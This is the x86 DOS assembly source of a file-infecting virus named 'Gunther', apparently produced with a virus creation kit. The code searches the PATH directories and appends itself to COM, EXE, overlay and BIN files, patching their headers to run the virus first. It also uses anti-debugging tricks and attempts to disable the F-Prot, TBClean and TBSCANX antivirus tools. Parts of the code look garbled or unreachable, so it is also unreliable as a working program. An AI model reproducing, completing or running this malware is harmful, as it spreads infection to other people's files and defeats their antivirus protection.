; 'Gunther': A Virus From the Virus Creation 2000 System
; The Virus Creation 2000 System is Copywrited by John Burnette
; All Rights Reserved.

; Author: Havoc The Chaos
; Notes: FÅr my lurv, Kiersten B.

; Greetings: Dark Angel, DecimatoR, Dark Avenger (You still out there?)
;            The Additude Adjuster, Mucho Mass, The Old Bit Truth Crew,
;            and virus writters (Except those who rely on kits and call
;            them original code) everywhere!

code    segment byte public
        assume  cs: code
        org     100h

id      =       '=-'

begin:
        call    next                            ; Get Delta Offset
next:   pop     bp
        sub     bp, offset next

        push    cs
        push    cs
        pop     ds
        pop     es

        mov     byte ptr [bp + lock_keys + 3], 244
                                                ; Prefetch Cue Unchanged
lock_keys:
        mov     al, 128                         ; Screws DEBUG
        out     21h, al                         ; If Tracing, Lock Keyboard

        mov     ax, 4653h                       ; Remove F-Prot Utils
        mov     bx, 1
        mov     cx, 2
        rep     int  2Fh


        mov     byte ptr cs:[tb_here][bp], 0    ; Reset TB Flag
        xor     dx, dx
        mov     ds, dx
        mov     ax, word ptr ds:[6]
        dec     ax
        mov     ds, ax

        mov     cx, 0FFFFh                      ; CX = 64k
        mov     si, dx                          ; SI = 0

look_4_tbclean:
        mov     ax, word ptr ds:[si]
        xor     ax, 0A5F3h
        je      check_it                        ; Jump If It's TBClean
look_again:
        inc     si                              ; Continue Search
        loop    look_4_tbclean
        jmp     not_found                       ; TBClean Not Found

check_it:
        mov     ax, word ptr ds:[si+4]
        xor     ax, 0006h
        jne     look_again
        mov     ax, word ptr ds:[si+10]
        xor     ax, 020Eh
        jne     look_again
        mov     ax, word ptr ds:[si+12]
        xor     ax, 0C700h
        jne     look_again
        mov     ax, word ptr ds:[si+14]
        xor     ax, 406h
        jne     look_again

        mov     bx, word ptr ds:[si+17]         ; Steal REAL Int 1 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replace With IRET

        mov     bx, word ptr ds:[si+27]         ; Steal REAL Int 3 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replece With IRET

        mov     byte ptr cs:[tb_here][bp], 1    ; Set The TB Flag On

        mov     bx, word ptr ds:[si+51h]        ; Get 2nd Segment of
        mov     word ptr cs:[tb_int2][bp], bx   ; Vector Table

        mov     bx, word ptr ds:[si-5]          ; Get Offset of 1st Copy
        mov     word ptr cs:[tb_ints][bp], bx   ; of Vector Table

not_found:
        mov     cx, 9EBh
        mov     ax, 0FE05h
        jmp     $-2
        add     ah, 3Bh                         ; Hlt Instruction (Kills TD)
        jmp     $-10

        mov     ax, 0CA00h                      ; Exit It TBSCANX In Mem
        mov     bx, 'TB'
        int     2Fh

        cmp     al, 0
        je      okay
        ret

okay:

        mov     ah, 47h
        xor     dl, dl
        lea     si, [bp+offset dir_buff+1]       ; Save Original Directory
        int     21h

        push    es                              ; New DTA
        push    ds
        mov     ah, 1Ah
        lea     dx, [bp+offset newDTA]
        int     21h

        lea     di, [bp+offset origCSIP2]       ; Save For EXE
        lea     si, [bp+offset origCSIP]
        mov     cx, 4
        rep     movsw

        mov     byte ptr [bp+numinfected], 0

        mov     ax, 3524h                       ; New INT 24h Handler
        int     21h
        mov     ax, 2524h
        mov     dx, offset Int24
        int     21h

traverse_path   proc    near

        push    bp
        pop     bx
        mov     es, word ptr cs:[2Ch]           ; ES = Environment Segment
        xor     di, di                          ; DI = Starting Offset

find_path:
        mov     dx,'As'
        int     0F2h
        lea     si,[bx + path_string]             ; SI points to "PATH="
        lodsb                                   ; Load First Byte in AL
        mov     cx,08000h                       ; Check 32767 Bytes
        repne   scasb                           ; Search Until The Byte Is Found
        mov     cx,4                            ; Check The Next Four Bytes

check_next_4:
        lodsb                                   ; Load The Next Letter of "PATH="
        scasb                                   ; Compare It To Environment
        jne     find_path                       ; Get Another
        loop    check_next_4                    ; Keep Checking

        mov     word ptr [bx + path_ad], di     ; Save The PATH Address
        mov     word ptr [bx + path_ad + 2], es ; Save The PATH's Segment

        lds     si,dword ptr [bx + path_ad]     ; DS:SI Points to PATH
        lea     di,[bp - 70]                    ; DI = Work Buffer
        push    cs
        pop     es

move_subdir:
        lodsb                                   ; Load Next Byte
        cmp     al,';'                          ; Separator?
        je      moved_one                       ; Yes, We're Done
        or      al,al                           ; End of Path?
        je      moved_last_one                  ; Yes, Quit Our Loop
        stosb                                   ; Store Byte at ES:DI
        jmp     short move_subdir               ; Keep Transfering Characters

moved_last_one:
        xor     si, si                          ; Clear Buffer
moved_one:
        mov     word ptr es:[bx + path_ad],si   ; Store SI in the path address

        cmp     si, 0                           ; Done?
        je      done                            ; Done.

        mov     ah, 3Bh                         ; Change Directory
        lea     dx, [bx + path_ad]
        int     21h

        lea     dx, [di + com_spec]             ; Find COM Files
        call    infect
        lea     dx, [di + exe_spec]             ; Find EXE Files
        call    infect
        lea     dx, [di + ovr_spec]             ; Find OV? Files
        call    infect
        lea     dx, [di + bin_spec]             ; Find Binary Files
        call    infect
        jmp     move_subdir                     ; Get Another Sub-Directory

done:   ret

traverse_path	endp
        pop     ds                              ; Restore DTA
        pop     es
        mov     ah, 1Ah
        mov     dx, 80h
        int     21h

        cmp     sp, id                          ; EXE?
        jne     infect

restore_exe:                                    ; Restore EXE
        mov     ax, ds
        add     ax, 10h
        add     cs:[bp+word ptr origCSIP2+2], ax
        add     ax, cs:[bp+word ptr origSPSS2]
        cli
        mov     ss, ax
        mov     sp, cs:[bp+word ptr origSPSS2+2]
        sti
        db      00EAh                           ; Jump To The Original Code
origCSIP2       db      ?
old3_2          db      ?,?,?
origSPSS2       dd      ?
origCSIP        db      ?
old3            db      0cdh,20h,0
origSPSS        dd      ?

restore_com:                                    ; Restore COM
        mov     di, 100h
        push    di
        lea     si, [bp+offset old3_2]
        movsw
        movsb

return: ret                                     ; Jump To Original Code

infect:
        mov     cx, 7
        mov     ah, 4Eh                         ; Find First File
findfirstnext:
        int     21h
        jc      return

        cmp     word ptr [bp+newDTA+33], 'AM'   ; COMMAND.COM?
        mov     ah, 4Fh
        jz      findfirstnext                   ; Yes, So Get Another File

        lea     dx, [bp+newDTA+30]              ; Get Attributes
        mov     ax, 4300h
        int     21h
        jc      return
        push    cx                              ; Save Them
        push    dx

        mov     ax, 4301h                       ; Clear Attributes
        push    ax
        xor     cx, cx
        int     21h

        mov     ax, 3D02h                       ; Open File, Read/Write
        lea     dx, [bp+newDTA+30]
        int     21h
        xchg    ax, bx

        mov     ax, 5700h                       ; Get File Time/Date
        int     21h
        push    cx                              ; Save Time/Date
        push    dx

        mov     ah, 3Fh
        mov     cx, 1Ah                         ; Read Into File
        lea     dx, [bp+offset readbuffer]
        int     21h

        mov     ax, 4202h                       ; Move Pointer To End Of File
        xor     cx, cx
        cwd
        int     21h

        cmp     word ptr [bp+offset readbuffer], 'ZM'   ; EXE?
        jz      checkexe

        mov     cx, word ptr [bp+offset readbuffer+1]
        add     cx, heap-begin+3                ; CX = Filesize
        cmp     ax, cx
        jz      jmp_close                       ; Already Infected

        cmp     ax, 65535-(endheap-begin)       ; Too Large To Infect?
        ja      jmp_close

        lea     di, [bp+offset old3]            ; Save First Three Bytes
        lea     si, [bp+offset readbuffer]
        movsb
        movsw

        mov     cx, 3                           ; Encoded Jump To Virus
        sub     ax, cx
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 0E9h
        mov     byte ptr [bp+offset readbuffer], dl
        jmp     short continue_infect

checkexe:
        cmp     word ptr [bp+offset readbuffer+10h], id
        jnz     skipp                           ; Not Infected, So Infect It

jmp_close:
        jmp     close                           ; Infected, So Quit

skipp:  lea     di, [bp+origCSIP]
        lea     si, [bp+readbuffer+14h]
        movsw                                   ; Save CS and IP
        movsw

        sub     si, 0Ah                         ; Save SS and SP
        movsw
        movsw

        push    bx                              ; Filename
        mov     bx, word ptr [bp+readbuffer+8]  ; Header Size
        mov     cl, 4
        shl     bx, cl

        push    dx
        push    ax

        sub     ax, bx                          ; File Size - Header Size
        sbb     dx, 0

        mov     cx, 10h
        div     cx

        mov     word ptr [bp+readbuffer+0Eh], ax ; SS
        mov     word ptr [bp+readbuffer+10h], id ; SP
        mov     word ptr [bp+readbuffer+14h], dx ; IP
        mov     word ptr [bp+readbuffer+16h], ax ; CS

        pop     ax
        pop     dx

        add     ax, heap-begin
        adc     dx, 0

        mov     cl, 9
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc
        adc     dx, ax
        pop     ax
        and     ah, 1

        mov     word ptr [bp+readbuffer+2], ax
        mov     word ptr [bp+readbuffer+4], dx  ; Fix Header

        pop     bx
        mov     cx, 1Ah

continue_infect:

        mov     ah, 40h
        mov     cx, heap-begin                  ; Add Virus To The End
        lea     dx, [bp+offset begin]
        int     21h

        mov     ax, 4200h
        xor     cx, cx                          ; Move Pointer To Beginning
        cwd
        int     21h

        mov     ah, 40h
        mov     cx, 1Ah                         ; Write Encoded Jump To Virus
        lea     dx, [bp+offset readbuffer]
        int     21h

        inc     [bp+numinfected]                  ; Infection Good

close:
        mov     ax, 5701h                       ; Set Orig Date and Time
        pop     dx
        pop     cx
        int     21h

        mov     ah, 3Eh                         ; Close File
        int     21h

        pop     ax                              ; Restore Attributes
        pop     dx
        pop     cx
        int     21h

        cmp     [bp+numinfected], 5
        jae     bye
        mov     ah, 4Fh                         ; No, So Find Another File
        jmp     findfirstnext

        mov     ax, 2524h                       ; New INT 24h Handler
        pop     dx
        pop     ds
        int     21h

        mov     ah, 3Bh                         ; Function: Change Directory
        lea     dx, [bp+dir_buff]               ; Restore Current Directory
        int     21h                             ; Execute Function

bye:    ret

Int24:  mov     ax, 3                           ; Error Handling
        iret    


exe_spec        db      '*.EXE',0               ; EXE Filespec
ovr_spec        db      '*.OV?',0               ; OV? Filespec
bin_spec        db      '*.BIN',0               ; BIN Filespec
com_spec        db      '*.COM',0               ; COM Filespec
path_string     db      "PATH="         ; The PATH String To Search For

heap:
donebin         db      0
dir_buff        db      64 dup (0)              ; Current Dir Buffer
newdta          db      43 dup (?)              ; New Disk Transfer Access
numinfected     db      ?                       ; Number Of Files Infected
path_ad         dd      ?               ; Holds The PATH's Address
tb_ints         dd      0
tb_int2         dd      0
tb_here         db      0
readbuffer      db      1ah dup (?)
endheap:

code    ends
        end begin
